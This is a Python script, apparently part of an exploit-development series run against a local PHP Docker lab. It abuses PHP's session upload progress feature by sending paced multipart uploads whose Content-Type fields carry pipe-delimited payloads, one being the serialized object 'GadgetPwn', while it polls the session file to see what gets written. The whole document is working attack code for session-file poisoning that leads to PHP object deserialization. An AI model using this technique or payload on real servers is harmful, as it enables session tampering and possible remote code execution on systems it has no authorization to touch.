#!/usr/bin/env python3
"""up7: which CT kills the record? paced uploads + live mid-upload polling.
A: clean CT (application/octet-stream)  — expect record appears mid-upload
B: pipe CT (x|marker|)                  — does a bare pipe break parse?
C: payload CT (x|O:9:"GadgetPwn":0:{}|) — up6 repeat, control
Each: poll sess file during upload; RST at 2M; report max size seen + content.
"""
import socket, subprocess, threading, uuid, time

HOST, PORT = "127.0.0.1", 8086

def attempt(tag, ct):
    SID = uuid.uuid4().hex
    P = "u7_" + tag
    stop = False
    maxsize = [0]
    seen = [b""]

    def poll():
        while not stop:
            r = subprocess.run(["docker", "exec", "php_up", "sh", "-c",
                "if [ -f /tmp/sess_%s ]; then wc -c < /tmp/sess_%s; else echo 0; fi" % (SID, SID)],
                capture_output=True, timeout=15)
            try:
                sz = int(r.stdout.decode().strip() or "0")
            except ValueError:
                sz = 0
            if sz > maxsize[0]:
                maxsize[0] = sz
                raw = subprocess.run(["docker", "exec", "php_up", "cat", "/tmp/sess_" + SID],
                                     capture_output=True, timeout=15).stdout
                seen[0] = raw
            time.sleep(0.4)

    body_head = (
        "------up7\r\n"
        "Content-Disposition: form-data; name=\"PHP_SESSION_UPLOAD_PROGRESS\"\r\n\r\n"
        + P + "\r\n"
        "------up7\r\n"
        "Content-Disposition: form-data; name=\"f\"; filename=\"ok.txt\"\r\n"
        "Content-Type: " + ct + "\r\n\r\n"
    ).encode("latin1")
    TOTAL = 100_000_000
    req = (
        "POST /target.php HTTP/1.1\r\n"
        "Host: 127.0.0.1:8086\r\n"
        "Cookie: PHPSESSID=" + SID + "\r\n"
        "Content-Type: multipart/form-data; boundary=----up7\r\n"
        "Content-Length: " + str(len(body_head) + TOTAL) + "\r\n"
        "\r\n"
    ).encode()
    t = threading.Thread(target=poll, daemon=True)
    t.start()
    s = socket.create_connection((HOST, PORT), timeout=30)
    s.sendall(req + body_head)
    pad = b"P" * 65536
    sent = 0
    while sent < 2_000_000:
        s.sendall(pad); sent += len(pad)
        time.sleep(0.12)
    s.setsockopt(socket.SOL_SOCKET, socket.SO_LINGER, b"\x01\x00\x00\x00\x00\x00\x00\x00")
    s.close()
    time.sleep(2.0)
    stop = True
    time.sleep(0.5)
    print("[%s] ct=%r" % (tag, ct), flush=True)
    print("    max sess size seen mid/post-upload:", maxsize[0], flush=True)
    if seen[0]:
        print("    latin1:", seen[0].decode("latin1", "replace")[:350], flush=True)
    return SID, maxsize[0], seen[0]

attempt("A_clean", "application/octet-stream")
attempt("B_pipe", "x|marker|")
attempt("C_payload", 'x|O:9:"GadgetPwn":0:{}|')
